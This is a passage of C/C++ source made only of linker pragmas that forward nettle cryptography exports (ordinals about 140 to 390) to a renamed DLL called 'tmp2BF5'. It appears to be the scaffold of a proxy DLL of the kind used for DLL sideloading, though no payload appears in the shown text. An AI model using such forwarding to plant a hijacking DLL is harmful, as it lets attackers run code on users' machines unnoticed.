&quot;/export:nettle_camellia256_set_decrypt_key=tmp2BF5.nettle_camellia256_set_decrypt_key,@140&quot;)#pragma comment(linker, &quot;/export:nettle_camellia256_set_encrypt_key=tmp2BF5.nettle_camellia256_set_encrypt_key,@141&quot;)#pragma comment(linker, &quot;/export:nettle_camellia_set_decrypt_key=tmp2BF5.nettle_camellia_set_decrypt_key,@142&quot;)#pragma comment(linker, &quot;/export:nettle_cast128=tmp2BF5.nettle_cast128,@143&quot;)#pragma comment(linker, &quot;/export:nettle_cast128_decrypt=tmp2BF5.nettle_cast128_decrypt,@144&quot;)#pragma comment(linker, &quot;/export:nettle_cast128_encrypt=tmp2BF5.nettle_cast128_encrypt,@145&quot;)#pragma comment(linker, &quot;/export:nettle_cast128_set_key=tmp2BF5.nettle_cast128_set_key,@146&quot;)#pragma comment(linker, &quot;/export:nettle_cast5_set_key=tmp2BF5.nettle_cast5_set_key,@147&quot;)#pragma comment(linker, &quot;/export:nettle_cbc_decrypt=tmp2BF5.nettle_cbc_decrypt,@148&quot;)#pragma comment(linker, &quot;/export:nettle_cbc_encrypt=tmp2BF5.nettle_cbc_encrypt,@149&quot;)#pragma comment(linker, &quot;/export:nettle_ccm_aes128_decrypt=tmp2BF5.nettle_ccm_aes128_decrypt,@150&quot;)#pragma comment(linker, &quot;/export:nettle_ccm_aes128_decrypt_message=tmp2BF5.nettle_ccm_aes128_decrypt_message,@151&quot;)#pragma comment(linker, &quot;/export:nettle_ccm_aes128_digest=tmp2BF5.nettle_ccm_aes128_digest,@152&quot;)#pragma comment(linker, &quot;/export:nettle_ccm_aes128_encrypt=tmp2BF5.nettle_ccm_aes128_encrypt,@153&quot;)#pragma comment(linker, &quot;/export:nettle_ccm_aes128_encrypt_message=tmp2BF5.nettle_ccm_aes128_encrypt_message,@154&quot;)#pragma comment(linker, &quot;/export:nettle_ccm_aes128_set_key=tmp2BF5.nettle_ccm_aes128_set_key,@155&quot;)#pragma comment(linker, &quot;/export:nettle_ccm_aes128_set_nonce=tmp2BF5.nettle_ccm_aes128_set_nonce,@156&quot;)#pragma comment(linker, &quot;/export:nettle_ccm_aes128_update=tmp2BF5.nettle_ccm_aes128_update,@157&quot;)#pragma comment(linker, &quot;/export:nettle_ccm_aes192_decrypt=tmp2BF5.nettle_ccm_aes192_decrypt,@158&quot;)#pragma comment(linker, &quot;/export:nettle_ccm_aes192_decrypt_message=tmp2BF5.nettle_ccm_aes192_decrypt_message,@159&quot;)#pragma comment(linker, &quot;/export:nettle_ccm_aes192_digest=tmp2BF5.nettle_ccm_aes192_digest,@160&quot;)#pragma comment(linker, &quot;/export:nettle_ccm_aes192_encrypt=tmp2BF5.nettle_ccm_aes192_encrypt,@161&quot;)#pragma comment(linker, &quot;/export:nettle_ccm_aes192_encrypt_message=tmp2BF5.nettle_ccm_aes192_encrypt_message,@162&quot;)#pragma comment(linker, &quot;/export:nettle_ccm_aes192_set_key=tmp2BF5.nettle_ccm_aes192_set_key,@163&quot;)#pragma comment(linker, &quot;/export:nettle_ccm_aes192_set_nonce=tmp2BF5.nettle_ccm_aes192_set_nonce,@164&quot;)#pragma comment(linker, &quot;/export:nettle_ccm_aes192_update=tmp2BF5.nettle_ccm_aes192_update,@165&quot;)#pragma comment(linker, &quot;/export:nettle_ccm_aes256_decrypt=tmp2BF5.nettle_ccm_aes256_decrypt,@166&quot;)#pragma comment(linker, &quot;/export:nettle_ccm_aes256_decrypt_message=tmp2BF5.nettle_ccm_aes256_decrypt_message,@167&quot;)#pragma comment(linker, &quot;/export:nettle_ccm_aes256_digest=tmp2BF5.nettle_ccm_aes256_digest,@168&quot;)#pragma comment(linker, &quot;/export:nettle_ccm_aes256_encrypt=tmp2BF5.nettle_ccm_aes256_encrypt,@169&quot;)#pragma comment(linker, &quot;/export:nettle_ccm_aes256_encrypt_message=tmp2BF5.nettle_ccm_aes256_encrypt_message,@170&quot;)#pragma comment(linker, &quot;/export:nettle_ccm_aes256_set_key=tmp2BF5.nettle_ccm_aes256_set_key,@171&quot;)#pragma comment(linker, &quot;/export:nettle_ccm_aes256_set_nonce=tmp2BF5.nettle_ccm_aes256_set_nonce,@172&quot;)#pragma comment(linker, &quot;/export:nettle_ccm_aes256_update=tmp2BF5.nettle_ccm_aes256_update,@173&quot;)#pragma comment(linker, &quot;/export:nettle_ccm_decrypt=tmp2BF5.nettle_ccm_decrypt,@174&quot;)#pragma comment(linker, &quot;/export:nettle_ccm_decrypt_message=tmp2BF5.nettle_ccm_decrypt_message,@175&quot;)#pragma comment(linker, &quot;/export:nettle_ccm_digest=tmp2BF5.nettle_ccm_digest,@176&quot;)#pragma comment(linker, &quot;/export:nettle_ccm_encrypt=tmp2BF5.nettle_ccm_encrypt,@177&quot;)#pragma comment(linker, &quot;/export:nettle_ccm_encrypt_message=tmp2BF5.nettle_ccm_encrypt_message,@178&quot;)#pragma comment(linker, &quot;/export:nettle_ccm_set_nonce=tmp2BF5.nettle_ccm_set_nonce,@179&quot;)#pragma comment(linker, &quot;/export:nettle_ccm_update=tmp2BF5.nettle_ccm_update,@180&quot;)#pragma comment(linker, &quot;/export:nettle_cfb8_decrypt=tmp2BF5.nettle_cfb8_decrypt,@181&quot;)#pragma comment(linker, &quot;/export:nettle_cfb8_encrypt=tmp2BF5.nettle_cfb8_encrypt,@182&quot;)#pragma comment(linker, &quot;/export:nettle_cfb_decrypt=tmp2BF5.nettle_cfb_decrypt,@183&quot;)#pragma comment(linker, &quot;/export:nettle_cfb_encrypt=tmp2BF5.nettle_cfb_encrypt,@184&quot;)#pragma comment(linker, &quot;/export:nettle_chacha_crypt=tmp2BF5.nettle_chacha_crypt,@185&quot;)#pragma comment(linker, &quot;/export:nettle_chacha_crypt32=tmp2BF5.nettle_chacha_crypt32,@186&quot;)#pragma comment(linker, &quot;/export:nettle_chacha_poly1305=tmp2BF5.nettle_chacha_poly1305,@187&quot;)#pragma comment(linker, &quot;/export:nettle_chacha_poly1305_decrypt=tmp2BF5.nettle_chacha_poly1305_decrypt,@188&quot;)#pragma comment(linker, &quot;/export:nettle_chacha_poly1305_digest=tmp2BF5.nettle_chacha_poly1305_digest,@189&quot;)#pragma comment(linker, &quot;/export:nettle_chacha_poly1305_encrypt=tmp2BF5.nettle_chacha_poly1305_encrypt,@190&quot;)#pragma comment(linker, &quot;/export:nettle_chacha_poly1305_set_key=tmp2BF5.nettle_chacha_poly1305_set_key,@191&quot;)#pragma comment(linker, &quot;/export:nettle_chacha_poly1305_set_nonce=tmp2BF5.nettle_chacha_poly1305_set_nonce,@192&quot;)#pragma comment(linker, &quot;/export:nettle_chacha_poly1305_update=tmp2BF5.nettle_chacha_poly1305_update,@193&quot;)#pragma comment(linker, &quot;/export:nettle_chacha_set_counter=tmp2BF5.nettle_chacha_set_counter,@194&quot;)#pragma comment(linker, &quot;/export:nettle_chacha_set_counter32=tmp2BF5.nettle_chacha_set_counter32,@195&quot;)#pragma comment(linker, &quot;/export:nettle_chacha_set_key=tmp2BF5.nettle_chacha_set_key,@196&quot;)#pragma comment(linker, &quot;/export:nettle_chacha_set_nonce=tmp2BF5.nettle_chacha_set_nonce,@197&quot;)#pragma comment(linker, &quot;/export:nettle_chacha_set_nonce96=tmp2BF5.nettle_chacha_set_nonce96,@198&quot;)#pragma comment(linker, &quot;/export:nettle_cmac128_digest=tmp2BF5.nettle_cmac128_digest,@199&quot;)#pragma comment(linker, &quot;/export:nettle_cmac128_init=tmp2BF5.nettle_cmac128_init,@200&quot;)#pragma comment(linker, &quot;/export:nettle_cmac128_set_key=tmp2BF5.nettle_cmac128_set_key,@201&quot;)#pragma comment(linker, &quot;/export:nettle_cmac128_update=tmp2BF5.nettle_cmac128_update,@202&quot;)#pragma comment(linker, &quot;/export:nettle_cmac64_digest=tmp2BF5.nettle_cmac64_digest,@203&quot;)#pragma comment(linker, &quot;/export:nettle_cmac64_init=tmp2BF5.nettle_cmac64_init,@204&quot;)#pragma comment(linker, &quot;/export:nettle_cmac64_set_key=tmp2BF5.nettle_cmac64_set_key,@205&quot;)#pragma comment(linker, &quot;/export:nettle_cmac64_update=tmp2BF5.nettle_cmac64_update,@206&quot;)#pragma comment(linker, &quot;/export:nettle_cmac_aes128=tmp2BF5.nettle_cmac_aes128,@207&quot;)#pragma comment(linker, &quot;/export:nettle_cmac_aes128_digest=tmp2BF5.nettle_cmac_aes128_digest,@208&quot;)#pragma comment(linker, &quot;/export:nettle_cmac_aes128_set_key=tmp2BF5.nettle_cmac_aes128_set_key,@209&quot;)#pragma comment(linker, &quot;/export:nettle_cmac_aes128_update=tmp2BF5.nettle_cmac_aes128_update,@210&quot;)#pragma comment(linker, &quot;/export:nettle_cmac_aes256=tmp2BF5.nettle_cmac_aes256,@211&quot;)#pragma comment(linker, &quot;/export:nettle_cmac_aes256_digest=tmp2BF5.nettle_cmac_aes256_digest,@212&quot;)#pragma comment(linker, &quot;/export:nettle_cmac_aes256_set_key=tmp2BF5.nettle_cmac_aes256_set_key,@213&quot;)#pragma comment(linker, &quot;/export:nettle_cmac_aes256_update=tmp2BF5.nettle_cmac_aes256_update,@214&quot;)#pragma comment(linker, &quot;/export:nettle_cmac_des3=tmp2BF5.nettle_cmac_des3,@215&quot;)#pragma comment(linker, &quot;/export:nettle_cmac_des3_digest=tmp2BF5.nettle_cmac_des3_digest,@216&quot;)#pragma comment(linker, &quot;/export:nettle_cmac_des3_set_key=tmp2BF5.nettle_cmac_des3_set_key,@217&quot;)#pragma comment(linker, &quot;/export:nettle_cmac_des3_update=tmp2BF5.nettle_cmac_des3_update,@218&quot;)#pragma comment(linker, &quot;/export:nettle_cnd_memcpy=tmp2BF5.nettle_cnd_memcpy,@219&quot;)#pragma comment(linker, &quot;/export:nettle_ctr_crypt=tmp2BF5.nettle_ctr_crypt,@220&quot;)#pragma comment(linker, &quot;/export:nettle_des3_decrypt=tmp2BF5.nettle_des3_decrypt,@221&quot;)#pragma comment(linker, &quot;/export:nettle_des3_encrypt=tmp2BF5.nettle_des3_encrypt,@222&quot;)#pragma comment(linker, &quot;/export:nettle_des3_set_key=tmp2BF5.nettle_des3_set_key,@223&quot;)#pragma comment(linker, &quot;/export:nettle_des_check_parity=tmp2BF5.nettle_des_check_parity,@224&quot;)#pragma comment(linker, &quot;/export:nettle_des_decrypt=tmp2BF5.nettle_des_decrypt,@225&quot;)#pragma comment(linker, &quot;/export:nettle_des_encrypt=tmp2BF5.nettle_des_encrypt,@226&quot;)#pragma comment(linker, &quot;/export:nettle_des_fix_parity=tmp2BF5.nettle_des_fix_parity,@227&quot;)#pragma comment(linker, &quot;/export:nettle_des_set_key=tmp2BF5.nettle_des_set_key,@228&quot;)#pragma comment(linker, &quot;/export:nettle_eax_aes128=tmp2BF5.nettle_eax_aes128,@229&quot;)#pragma comment(linker, &quot;/export:nettle_eax_aes128_decrypt=tmp2BF5.nettle_eax_aes128_decrypt,@230&quot;)#pragma comment(linker, &quot;/export:nettle_eax_aes128_digest=tmp2BF5.nettle_eax_aes128_digest,@231&quot;)#pragma comment(linker, &quot;/export:nettle_eax_aes128_encrypt=tmp2BF5.nettle_eax_aes128_encrypt,@232&quot;)#pragma comment(linker, &quot;/export:nettle_eax_aes128_set_key=tmp2BF5.nettle_eax_aes128_set_key,@233&quot;)#pragma comment(linker, &quot;/export:nettle_eax_aes128_set_nonce=tmp2BF5.nettle_eax_aes128_set_nonce,@234&quot;)#pragma comment(linker, &quot;/export:nettle_eax_aes128_update=tmp2BF5.nettle_eax_aes128_update,@235&quot;)#pragma comment(linker, &quot;/export:nettle_eax_decrypt=tmp2BF5.nettle_eax_decrypt,@236&quot;)#pragma comment(linker, &quot;/export:nettle_eax_digest=tmp2BF5.nettle_eax_digest,@237&quot;)#pragma comment(linker, &quot;/export:nettle_eax_encrypt=tmp2BF5.nettle_eax_encrypt,@238&quot;)#pragma comment(linker, &quot;/export:nettle_eax_set_key=tmp2BF5.nettle_eax_set_key,@239&quot;)#pragma comment(linker, &quot;/export:nettle_eax_set_nonce=tmp2BF5.nettle_eax_set_nonce,@240&quot;)#pragma comment(linker, &quot;/export:nettle_eax_update=tmp2BF5.nettle_eax_update,@241&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_aes128=tmp2BF5.nettle_gcm_aes128,@242&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_aes128_decrypt=tmp2BF5.nettle_gcm_aes128_decrypt,@243&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_aes128_digest=tmp2BF5.nettle_gcm_aes128_digest,@244&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_aes128_encrypt=tmp2BF5.nettle_gcm_aes128_encrypt,@245&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_aes128_set_iv=tmp2BF5.nettle_gcm_aes128_set_iv,@246&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_aes128_set_key=tmp2BF5.nettle_gcm_aes128_set_key,@247&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_aes128_update=tmp2BF5.nettle_gcm_aes128_update,@248&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_aes192=tmp2BF5.nettle_gcm_aes192,@249&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_aes192_decrypt=tmp2BF5.nettle_gcm_aes192_decrypt,@250&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_aes192_digest=tmp2BF5.nettle_gcm_aes192_digest,@251&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_aes192_encrypt=tmp2BF5.nettle_gcm_aes192_encrypt,@252&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_aes192_set_iv=tmp2BF5.nettle_gcm_aes192_set_iv,@253&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_aes192_set_key=tmp2BF5.nettle_gcm_aes192_set_key,@254&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_aes192_update=tmp2BF5.nettle_gcm_aes192_update,@255&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_aes256=tmp2BF5.nettle_gcm_aes256,@256&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_aes256_decrypt=tmp2BF5.nettle_gcm_aes256_decrypt,@257&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_aes256_digest=tmp2BF5.nettle_gcm_aes256_digest,@258&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_aes256_encrypt=tmp2BF5.nettle_gcm_aes256_encrypt,@259&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_aes256_set_iv=tmp2BF5.nettle_gcm_aes256_set_iv,@260&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_aes256_set_key=tmp2BF5.nettle_gcm_aes256_set_key,@261&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_aes256_update=tmp2BF5.nettle_gcm_aes256_update,@262&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_aes_decrypt=tmp2BF5.nettle_gcm_aes_decrypt,@263&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_aes_digest=tmp2BF5.nettle_gcm_aes_digest,@264&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_aes_encrypt=tmp2BF5.nettle_gcm_aes_encrypt,@265&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_aes_set_iv=tmp2BF5.nettle_gcm_aes_set_iv,@266&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_aes_set_key=tmp2BF5.nettle_gcm_aes_set_key,@267&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_aes_update=tmp2BF5.nettle_gcm_aes_update,@268&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_camellia128=tmp2BF5.nettle_gcm_camellia128,@269&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_camellia128_decrypt=tmp2BF5.nettle_gcm_camellia128_decrypt,@270&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_camellia128_digest=tmp2BF5.nettle_gcm_camellia128_digest,@271&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_camellia128_encrypt=tmp2BF5.nettle_gcm_camellia128_encrypt,@272&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_camellia128_set_iv=tmp2BF5.nettle_gcm_camellia128_set_iv,@273&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_camellia128_set_key=tmp2BF5.nettle_gcm_camellia128_set_key,@274&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_camellia128_update=tmp2BF5.nettle_gcm_camellia128_update,@275&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_camellia256=tmp2BF5.nettle_gcm_camellia256,@276&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_camellia256_decrypt=tmp2BF5.nettle_gcm_camellia256_decrypt,@277&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_camellia256_digest=tmp2BF5.nettle_gcm_camellia256_digest,@278&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_camellia256_encrypt=tmp2BF5.nettle_gcm_camellia256_encrypt,@279&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_camellia256_set_iv=tmp2BF5.nettle_gcm_camellia256_set_iv,@280&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_camellia256_set_key=tmp2BF5.nettle_gcm_camellia256_set_key,@281&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_camellia256_update=tmp2BF5.nettle_gcm_camellia256_update,@282&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_decrypt=tmp2BF5.nettle_gcm_decrypt,@283&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_digest=tmp2BF5.nettle_gcm_digest,@284&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_encrypt=tmp2BF5.nettle_gcm_encrypt,@285&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_set_iv=tmp2BF5.nettle_gcm_set_iv,@286&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_set_key=tmp2BF5.nettle_gcm_set_key,@287&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_update=tmp2BF5.nettle_gcm_update,@288&quot;)#pragma comment(linker, &quot;/export:nettle_get_aeads=tmp2BF5.nettle_get_aeads,@289&quot;)#pragma comment(linker, &quot;/export:nettle_get_armors=tmp2BF5.nettle_get_armors,@290&quot;)#pragma comment(linker, &quot;/export:nettle_get_ciphers=tmp2BF5.nettle_get_ciphers,@291&quot;)#pragma comment(linker, &quot;/export:nettle_get_hashes=tmp2BF5.nettle_get_hashes,@292&quot;)#pragma comment(linker, &quot;/export:nettle_get_macs=tmp2BF5.nettle_get_macs,@293&quot;)#pragma comment(linker, &quot;/export:nettle_gosthash94=tmp2BF5.nettle_gosthash94,@294&quot;)#pragma comment(linker, &quot;/export:nettle_gosthash94_digest=tmp2BF5.nettle_gosthash94_digest,@295&quot;)#pragma comment(linker, &quot;/export:nettle_gosthash94_init=tmp2BF5.nettle_gosthash94_init,@296&quot;)#pragma comment(linker, &quot;/export:nettle_gosthash94_update=tmp2BF5.nettle_gosthash94_update,@297&quot;)#pragma comment(linker, &quot;/export:nettle_gosthash94cp=tmp2BF5.nettle_gosthash94cp,@298&quot;)#pragma comment(linker, &quot;/export:nettle_gosthash94cp_digest=tmp2BF5.nettle_gosthash94cp_digest,@299&quot;)#pragma comment(linker, &quot;/export:nettle_gosthash94cp_update=tmp2BF5.nettle_gosthash94cp_update,@300&quot;)#pragma comment(linker, &quot;/export:nettle_hkdf_expand=tmp2BF5.nettle_hkdf_expand,@301&quot;)#pragma comment(linker, &quot;/export:nettle_hkdf_extract=tmp2BF5.nettle_hkdf_extract,@302&quot;)#pragma comment(linker, &quot;/export:nettle_hmac_digest=tmp2BF5.nettle_hmac_digest,@303&quot;)#pragma comment(linker, &quot;/export:nettle_hmac_gosthash94_digest=tmp2BF5.nettle_hmac_gosthash94_digest,@304&quot;)#pragma comment(linker, &quot;/export:nettle_hmac_gosthash94_set_key=tmp2BF5.nettle_hmac_gosthash94_set_key,@305&quot;)#pragma comment(linker, &quot;/export:nettle_hmac_gosthash94_update=tmp2BF5.nettle_hmac_gosthash94_update,@306&quot;)#pragma comment(linker, &quot;/export:nettle_hmac_gosthash94cp_digest=tmp2BF5.nettle_hmac_gosthash94cp_digest,@307&quot;)#pragma comment(linker, &quot;/export:nettle_hmac_gosthash94cp_set_key=tmp2BF5.nettle_hmac_gosthash94cp_set_key,@308&quot;)#pragma comment(linker, &quot;/export:nettle_hmac_gosthash94cp_update=tmp2BF5.nettle_hmac_gosthash94cp_update,@309&quot;)#pragma comment(linker, &quot;/export:nettle_hmac_md5=tmp2BF5.nettle_hmac_md5,@310&quot;)#pragma comment(linker, &quot;/export:nettle_hmac_md5_digest=tmp2BF5.nettle_hmac_md5_digest,@311&quot;)#pragma comment(linker, &quot;/export:nettle_hmac_md5_set_key=tmp2BF5.nettle_hmac_md5_set_key,@312&quot;)#pragma comment(linker, &quot;/export:nettle_hmac_md5_update=tmp2BF5.nettle_hmac_md5_update,@313&quot;)#pragma comment(linker, &quot;/export:nettle_hmac_ripemd160=tmp2BF5.nettle_hmac_ripemd160,@314&quot;)#pragma comment(linker, &quot;/export:nettle_hmac_ripemd160_digest=tmp2BF5.nettle_hmac_ripemd160_digest,@315&quot;)#pragma comment(linker, &quot;/export:nettle_hmac_ripemd160_set_key=tmp2BF5.nettle_hmac_ripemd160_set_key,@316&quot;)#pragma comment(linker, &quot;/export:nettle_hmac_ripemd160_update=tmp2BF5.nettle_hmac_ripemd160_update,@317&quot;)#pragma comment(linker, &quot;/export:nettle_hmac_set_key=tmp2BF5.nettle_hmac_set_key,@318&quot;)#pragma comment(linker, &quot;/export:nettle_hmac_sha1=tmp2BF5.nettle_hmac_sha1,@319&quot;)#pragma comment(linker, &quot;/export:nettle_hmac_sha1_digest=tmp2BF5.nettle_hmac_sha1_digest,@320&quot;)#pragma comment(linker, &quot;/export:nettle_hmac_sha1_set_key=tmp2BF5.nettle_hmac_sha1_set_key,@321&quot;)#pragma comment(linker, &quot;/export:nettle_hmac_sha1_update=tmp2BF5.nettle_hmac_sha1_update,@322&quot;)#pragma comment(linker, &quot;/export:nettle_hmac_sha224=tmp2BF5.nettle_hmac_sha224,@323&quot;)#pragma comment(linker, &quot;/export:nettle_hmac_sha224_digest=tmp2BF5.nettle_hmac_sha224_digest,@324&quot;)#pragma comment(linker, &quot;/export:nettle_hmac_sha224_set_key=tmp2BF5.nettle_hmac_sha224_set_key,@325&quot;)#pragma comment(linker, &quot;/export:nettle_hmac_sha256=tmp2BF5.nettle_hmac_sha256,@326&quot;)#pragma comment(linker, &quot;/export:nettle_hmac_sha256_digest=tmp2BF5.nettle_hmac_sha256_digest,@327&quot;)#pragma comment(linker, &quot;/export:nettle_hmac_sha256_set_key=tmp2BF5.nettle_hmac_sha256_set_key,@328&quot;)#pragma comment(linker, &quot;/export:nettle_hmac_sha256_update=tmp2BF5.nettle_hmac_sha256_update,@329&quot;)#pragma comment(linker, &quot;/export:nettle_hmac_sha384=tmp2BF5.nettle_hmac_sha384,@330&quot;)#pragma comment(linker, &quot;/export:nettle_hmac_sha384_digest=tmp2BF5.nettle_hmac_sha384_digest,@331&quot;)#pragma comment(linker, &quot;/export:nettle_hmac_sha384_set_key=tmp2BF5.nettle_hmac_sha384_set_key,@332&quot;)#pragma comment(linker, &quot;/export:nettle_hmac_sha512=tmp2BF5.nettle_hmac_sha512,@333&quot;)#pragma comment(linker, &quot;/export:nettle_hmac_sha512_digest=tmp2BF5.nettle_hmac_sha512_digest,@334&quot;)#pragma comment(linker, &quot;/export:nettle_hmac_sha512_set_key=tmp2BF5.nettle_hmac_sha512_set_key,@335&quot;)#pragma comment(linker, &quot;/export:nettle_hmac_sha512_update=tmp2BF5.nettle_hmac_sha512_update,@336&quot;)#pragma comment(linker, &quot;/export:nettle_hmac_update=tmp2BF5.nettle_hmac_update,@337&quot;)#pragma comment(linker, &quot;/export:nettle_knuth_lfib_get=tmp2BF5.nettle_knuth_lfib_get,@338&quot;)#pragma comment(linker, &quot;/export:nettle_knuth_lfib_get_array=tmp2BF5.nettle_knuth_lfib_get_array,@339&quot;)#pragma comment(linker, &quot;/export:nettle_knuth_lfib_init=tmp2BF5.nettle_knuth_lfib_init,@340&quot;)#pragma comment(linker, &quot;/export:nettle_knuth_lfib_random=tmp2BF5.nettle_knuth_lfib_random,@341&quot;)#pragma comment(linker, &quot;/export:nettle_lookup_hash=tmp2BF5.nettle_lookup_hash,@342&quot;)#pragma comment(linker, &quot;/export:nettle_md2=tmp2BF5.nettle_md2,@343&quot;)#pragma comment(linker, &quot;/export:nettle_md2_digest=tmp2BF5.nettle_md2_digest,@344&quot;)#pragma comment(linker, &quot;/export:nettle_md2_init=tmp2BF5.nettle_md2_init,@345&quot;)#pragma comment(linker, &quot;/export:nettle_md2_update=tmp2BF5.nettle_md2_update,@346&quot;)#pragma comment(linker, &quot;/export:nettle_md4=tmp2BF5.nettle_md4,@347&quot;)#pragma comment(linker, &quot;/export:nettle_md4_digest=tmp2BF5.nettle_md4_digest,@348&quot;)#pragma comment(linker, &quot;/export:nettle_md4_init=tmp2BF5.nettle_md4_init,@349&quot;)#pragma comment(linker, &quot;/export:nettle_md4_update=tmp2BF5.nettle_md4_update,@350&quot;)#pragma comment(linker, &quot;/export:nettle_md5=tmp2BF5.nettle_md5,@351&quot;)#pragma comment(linker, &quot;/export:nettle_md5_compress=tmp2BF5.nettle_md5_compress,@352&quot;)#pragma comment(linker, &quot;/export:nettle_md5_digest=tmp2BF5.nettle_md5_digest,@353&quot;)#pragma comment(linker, &quot;/export:nettle_md5_init=tmp2BF5.nettle_md5_init,@354&quot;)#pragma comment(linker, &quot;/export:nettle_md5_update=tmp2BF5.nettle_md5_update,@355&quot;)#pragma comment(linker, &quot;/export:nettle_memeql_sec=tmp2BF5.nettle_memeql_sec,@356&quot;)#pragma comment(linker, &quot;/export:nettle_memxor=tmp2BF5.nettle_memxor,@357&quot;)#pragma comment(linker, &quot;/export:nettle_memxor3=tmp2BF5.nettle_memxor3,@358&quot;)#pragma comment(linker, &quot;/export:nettle_pbkdf2=tmp2BF5.nettle_pbkdf2,@359&quot;)#pragma comment(linker, &quot;/export:nettle_pbkdf2_hmac_gosthash94cp=tmp2BF5.nettle_pbkdf2_hmac_gosthash94cp,@360&quot;)#pragma comment(linker, &quot;/export:nettle_pbkdf2_hmac_sha1=tmp2BF5.nettle_pbkdf2_hmac_sha1,@361&quot;)#pragma comment(linker, &quot;/export:nettle_pbkdf2_hmac_sha256=tmp2BF5.nettle_pbkdf2_hmac_sha256,@362&quot;)#pragma comment(linker, &quot;/export:nettle_poly1305_aes_digest=tmp2BF5.nettle_poly1305_aes_digest,@363&quot;)#pragma comment(linker, &quot;/export:nettle_poly1305_aes_set_key=tmp2BF5.nettle_poly1305_aes_set_key,@364&quot;)#pragma comment(linker, &quot;/export:nettle_poly1305_aes_set_nonce=tmp2BF5.nettle_poly1305_aes_set_nonce,@365&quot;)#pragma comment(linker, &quot;/export:nettle_poly1305_aes_update=tmp2BF5.nettle_poly1305_aes_update,@366&quot;)#pragma comment(linker, &quot;/export:nettle_realloc=tmp2BF5.nettle_realloc,@367&quot;)#pragma comment(linker, &quot;/export:nettle_ripemd160=tmp2BF5.nettle_ripemd160,@368&quot;)#pragma comment(linker, &quot;/export:nettle_ripemd160_digest=tmp2BF5.nettle_ripemd160_digest,@369&quot;)#pragma comment(linker, &quot;/export:nettle_ripemd160_init=tmp2BF5.nettle_ripemd160_init,@370&quot;)#pragma comment(linker, &quot;/export:nettle_ripemd160_update=tmp2BF5.nettle_ripemd160_update,@371&quot;)#pragma comment(linker, &quot;/export:nettle_salsa20_128_set_key=tmp2BF5.nettle_salsa20_128_set_key,@372&quot;)#pragma comment(linker, &quot;/export:nettle_salsa20_256_set_key=tmp2BF5.nettle_salsa20_256_set_key,@373&quot;)#pragma comment(linker, &quot;/export:nettle_salsa20_crypt=tmp2BF5.nettle_salsa20_crypt,@374&quot;)#pragma comment(linker, &quot;/export:nettle_salsa20_set_key=tmp2BF5.nettle_salsa20_set_key,@375&quot;)#pragma comment(linker, &quot;/export:nettle_salsa20_set_nonce=tmp2BF5.nettle_salsa20_set_nonce,@376&quot;)#pragma comment(linker, &quot;/export:nettle_salsa20r12_crypt=tmp2BF5.nettle_salsa20r12_crypt,@377&quot;)#pragma comment(linker, &quot;/export:nettle_serpent128=tmp2BF5.nettle_serpent128,@378&quot;)#pragma comment(linker, &quot;/export:nettle_serpent128_set_key=tmp2BF5.nettle_serpent128_set_key,@379&quot;)#pragma comment(linker, &quot;/export:nettle_serpent192=tmp2BF5.nettle_serpent192,@380&quot;)#pragma comment(linker, &quot;/export:nettle_serpent192_set_key=tmp2BF5.nettle_serpent192_set_key,@381&quot;)#pragma comment(linker, &quot;/export:nettle_serpent256=tmp2BF5.nettle_serpent256,@382&quot;)#pragma comment(linker, &quot;/export:nettle_serpent256_set_key=tmp2BF5.nettle_serpent256_set_key,@383&quot;)#pragma comment(linker, &quot;/export:nettle_serpent_decrypt=tmp2BF5.nettle_serpent_decrypt,@384&quot;)#pragma comment(linker, &quot;/export:nettle_serpent_encrypt=tmp2BF5.nettle_serpent_encrypt,@385&quot;)#pragma comment(linker, &quot;/export:nettle_serpent_set_key=tmp2BF5.nettle_serpent_set_key,@386&quot;)#pragma comment(linker, &quot;/export:nettle_sha1=tmp2BF5.nettle_sha1,@387&quot;)#pragma comment(linker, &quot;/export:nettle_sha1_compress=tmp2BF5.nettle_sha1_compress,@388&quot;)#pragma comment(linker, &quot;/export:nettle_sha1_digest=tmp2BF5.nettle_sha1_digest,@389&quot;)#pragma comment(linker, &quot;/export:nettle_sha1_init=tmp2BF5.nettle_sha1_init,@390&quot;)#pragma comment(linker, 